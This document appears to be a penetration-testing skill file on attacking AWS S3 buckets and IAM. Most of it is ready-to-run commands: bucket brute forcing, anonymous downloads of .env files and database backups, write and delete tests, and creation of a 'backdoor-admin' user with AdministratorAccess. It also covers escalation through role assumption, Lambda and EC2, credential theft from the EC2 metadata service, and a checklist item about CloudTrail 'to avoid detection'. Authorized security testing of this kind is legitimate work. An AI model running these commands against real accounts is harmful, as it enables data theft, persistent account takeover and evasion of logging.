---
name: aws-s3-iam
description: AWS S3 bucket misconfigurations and IAM privilege escalation - public buckets, overly permissive policies, role assumption, metadata service attacks
---

# AWS S3 & IAM Security Testing

## S3 Bucket Enumeration

### Discover S3 Buckets
```bash
# Install tools
pip install awscli boto3

# Enumerate buckets via DNS
# Pattern: bucket-name.s3.amazonaws.com or s3.amazonaws.com/bucket-name

# Use aws-cli to list buckets (if credentials available)
aws s3 ls

# Brute force bucket names
# Common patterns: company-backup, company-data, company-logs, company-assets
for bucket in target-backup target-data target-logs target-assets; do
  curl -I https://$bucket.s3.amazonaws.com 2>/dev/null | grep -E "HTTP|x-amz"
done

# Use tools like s3scanner, bucket-stream
pip install s3scanner
s3scanner scan --bucket target-company
```

### Test for Public Access
```bash
# Check if bucket is publicly readable
curl -s https://bucket-name.s3.amazonaws.com/ | head -20

# Check for listing permission
curl -s https://bucket-name.s3.amazonaws.com/?list-type=2

# Check specific objects
curl -I https://bucket-name.s3.amazonaws.com/sensitive-file.txt

# Test for public write access (DANGEROUS - only in authorized tests)
echo "test" > test.txt
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

### S3 Bucket Misconfigurations

**Public Read Access**
```bash
# List all objects in public bucket
aws s3 ls s3://bucket-name/ --no-sign-request --recursive

# Download sensitive files
aws s3 cp s3://bucket-name/config.json . --no-sign-request
aws s3 cp s3://bucket-name/backup.sql . --no-sign-request
aws s3 cp s3://bucket-name/.env . --no-sign-request

# Look for:
# - Database backups (.sql, .dump)
# - Configuration files (.env, config.json, credentials)
# - Source code (.zip, .tar.gz, .git)
# - Logs (.log)
# - Credentials (credentials.json, keys.pem)
```

**Public Write Access**
```bash
# Upload test file (authorized testing only)
echo "Security test - $(date)" > security-test.txt
aws s3 cp security-test.txt s3://bucket-name/ --no-sign-request

# Test for overwrite
aws s3 cp security-test.txt s3://bucket-name/existing-file.txt --no-sign-request

# Test for delete
aws s3 rm s3://bucket-name/test-file.txt --no-sign-request
```

**ACL Misconfiguration**
```bash
# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# Look for:
# - "AllUsers" or "AuthenticatedUsers" in ACL
# - WRITE or FULL_CONTROL permissions for public

# Check object ACL
aws s3api get-object-acl --bucket bucket-name --key sensitive-file.txt --no-sign-request
```

**Bucket Policy Misconfiguration**
```bash
# Get bucket policy
aws s3api get-bucket-policy --bucket bucket-name --no-sign-request

# Look for:
# - Principal: "*" (allows anyone)
# - Action: "s3:*" (all permissions)
# - Resource without restrictions
# - Condition blocks that can be bypassed
```

### S3 Data Exfiltration

**Sensitive Data Discovery**
```bash
# Search for sensitive patterns in bucket
aws s3 ls s3://bucket-name/ --recursive --no-sign-request | grep -iE "(password|secret|key|token|credential|backup|dump|config)"

# Download and search file contents
aws s3 sync s3://bucket-name/ ./bucket-data/ --no-sign-request
grep -r "password\|secret\|api_key\|token" ./bucket-data/
```

**Versioned Bucket Exploitation**
```bash
# List all versions (including deleted)
aws s3api list-object-versions --bucket bucket-name --no-sign-request

# Download specific version
aws s3api get-object --bucket bucket-name --key file.txt --version-id VERSION_ID file.txt --no-sign-request

# Restore deleted objects
aws s3api get-object --bucket bucket-name --key deleted-file.txt --version-id DELETE_MARKER_VERSION_ID deleted-file.txt
```

## IAM Enumeration & Testing

### IAM User Enumeration
```bash
# List IAM users (requires credentials)
aws iam list-users

# Get user details
aws iam get-user --user-name username

# List user policies
aws iam list-attached-user-policies --user-name username
aws iam list-user-policies --user-name username

# List user access keys
aws iam list-access-keys --user-name username

# List user groups
aws iam list-groups-for-user --user-name username
```

### IAM Role Enumeration
```bash
# List IAM roles
aws iam list-roles

# Get role details
aws iam get-role --role-name role-name

# List role policies
aws iam list-attached-role-policies --role-name role-name
aws iam list-role-policies --role-name role-name

# Get role policy document
aws iam get-role-policy --role-name role-name --policy-name policy-name
```

### IAM Policy Analysis

**Overly Permissive Policies**
```bash
# Look for dangerous policy patterns:

# 1. Wildcard actions
{
  "Effect": "Allow",
  "Action": "*",  # or "s3:*", "iam:*"
  "Resource": "*"
}

# 2. PassRole permission (privilege escalation)
{
  "Effect": "Allow",
  "Action": "iam:PassRole",
  "Resource": "*"
}

# 3. CreateAccessKey for other users
{
  "Effect": "Allow",
  "Action": "iam:CreateAccessKey",
  "Resource": "*"
}

# 4. UpdateLoginProfile (password change)
{
  "Effect": "Allow",
  "Action": "iam:UpdateLoginProfile",
  "Resource": "*"
}
```

**Policy Simulation**
```bash
# Simulate IAM policy
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::ACCOUNT_ID:user/username \
  --action-names s3:GetObject s3:PutObject iam:CreateUser

# Simulate custom policy
aws iam simulate-custom-policy \
  --policy-input-list '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:*","Resource":"*"}]}' \
  --action-names s3:DeleteBucket
```

### IAM Privilege Escalation

**Create New Admin User**
```bash
# If user has iam:CreateUser and iam:AttachUserPolicy
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-admin
```

**Assume Role Escalation**
```bash
# If user has sts:AssumeRole permission
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/admin-role \
  --role-session-name escalation-session

# Use temporary credentials
export AWS_ACCESS_KEY_ID="temp_key"
export AWS_SECRET_ACCESS_KEY="temp_secret"
export AWS_SESSION_TOKEN="temp_token"

# Now you have admin role permissions
aws s3 ls
aws iam list-users
```

**Lambda Function Escalation**
```bash
# If user has lambda:CreateFunction and iam:PassRole
# Create Lambda with admin role
aws lambda create-function \
  --function-name escalation \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT_ID:role/admin-role \
  --handler index.handler \
  --zip-file fileb://function.zip

# Invoke Lambda to perform admin actions
aws lambda invoke \
  --function-name escalation \
  --payload '{"action": "create_admin_user"}' \
  output.json
```

**EC2 Instance Profile Escalation**
```bash
# If user has iam:PassRole and ec2:RunInstances
# Launch EC2 with admin instance profile
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t2.micro \
  --iam-instance-profile Name=admin-profile \
  --key-name my-key

# SSH into instance and use instance metadata
ssh -i my-key.pem ec2-user@INSTANCE_IP
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

## EC2 Metadata Service Attacks

### Instance Metadata Service (IMDS)
```bash
# If you have SSRF or shell access to EC2 instance
# Access metadata service
curl http://169.254.169.254/latest/meta-data/

# Get IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response includes:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# Use credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### IMDSv1 vs IMDSv2
```bash
# IMDSv1 (vulnerable to SSRF)
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Check if IMDSv2 is enforced
curl -I http://169.254.169.254/latest/meta-data/
# If 401, IMDSv2 is enforced (good)
# If 200, IMDSv1 is allowed (vulnerable)
```

### Metadata Service Data Extraction
```bash
# Extract all metadata
curl http://169.254.169.254/latest/meta-data/ | while read line; do
  echo "=== $line ==="
  curl http://169.254.169.254/latest/meta-data/$line
  echo
done

# Get user data (startup scripts, may contain secrets)
curl http://169.254.169.254/latest/user-data/

# Get instance identity
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# Get network info
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

## Testing Checklist

- [ ] Enumerate S3 buckets (DNS, brute force, aws-cli)
- [ ] Test S3 buckets for public read access
- [ ] Test S3 buckets for public write access
- [ ] Check S3 bucket ACLs for misconfigurations
- [ ] Check S3 bucket policies for overly permissive rules
- [ ] Search S3 buckets for sensitive data (credentials, backups, configs)
- [ ] Test versioned S3 buckets for deleted object access
- [ ] Enumerate IAM users, roles, and policies
- [ ] Analyze IAM policies for overly permissive actions
- [ ] Test for IAM privilege escalation paths
- [ ] Test EC2 metadata service access (IMDSv1/v2)
- [ ] Extract IAM credentials from EC2 metadata service
- [ ] Test for SSRF to metadata service
- [ ] Check for public snapshots or AMIs
- [ ] Test for CloudTrail logging (to avoid detection)

## Tools

```bash
# AWS CLI
pip install awscli

# S3 enumeration
pip install s3scanner
# https://github.com/sa7mon/S3Scanner

# AWS exploitation framework
# https://github.com/BishopFox/pacu
pip install pacu

# IAM privilege escalation checker
# https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools

# Nuclei templates for AWS
nuclei -u https://target.com -t ~/nuclei-templates/misconfiguration/aws/
```

## Real-World Impact

**Case 1: Public S3 Bucket with Customer Data**
- Bucket: company-backup.s3.amazonaws.com
- Contents: Database dumps with PII
- Impact: Data breach, regulatory fines, reputation damage

**Case 2: IAM Privilege Escalation**
- Initial: Read-only user with iam:PassRole
- Escalation: Assumed admin role via Lambda
- Impact: Full account compromise

**Case 3: EC2 Metadata SSRF**
- Vulnerability: SSRF in web application
- Exploitation: Accessed metadata service, extracted IAM credentials
- Impact: Compromised IAM role with S3 and RDS access
